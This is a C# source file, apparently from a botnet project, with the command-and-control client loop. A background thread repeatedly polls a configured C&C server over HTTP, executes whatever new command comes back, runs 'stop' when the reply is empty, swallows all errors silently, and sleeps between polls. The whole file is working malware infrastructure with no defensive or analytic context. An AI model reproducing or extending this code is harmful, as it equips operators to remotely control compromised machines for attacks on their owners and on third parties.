using System.IO;
using System.Net;
using System.Threading;
using BotNet.Services.Command;

namespace BotNet.Services.Manager
{
    public class Control
    {
        private string sOldCommand;
        CommandService _commandService = new CommandService();
        public void ConnectControl()
        {
            Thread recvThread = new Thread(new ThreadStart(getCCServerCommand));
            recvThread.Start();
        }

        private void getCCServerCommand()
        {
            while (true)
            {
                try
                {
                    string command = GetRequest(Config.ServerAddress);

                    if (command.Length > 0)
                    {
                        if (command != sOldCommand)
                        {
                            _commandService.ExecuteCommand(command);
                            sOldCommand = command;
                        }
                    }
                    else
                    {
                        _commandService.ExecuteCommand("stop");

                        sOldCommand = string.Empty;
                    }
                }
                catch { }

                Thread.Sleep((int)(Config.ConnectionInterval * 5 * 0x3e8));
            }
        }

        private string GetRequest(string url)
        {
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "GET";
            req.ContentType = "application/x-www-form-urlencoded";
            WebResponse resp = req.GetResponse();
            string Out = "";
            using (Stream stream = resp.GetResponseStream())
            {
                using (StreamReader sr = new StreamReader(stream))
                {
                    Out = sr.ReadToEnd();
                }
            }
            return Out;
        }
    }
}
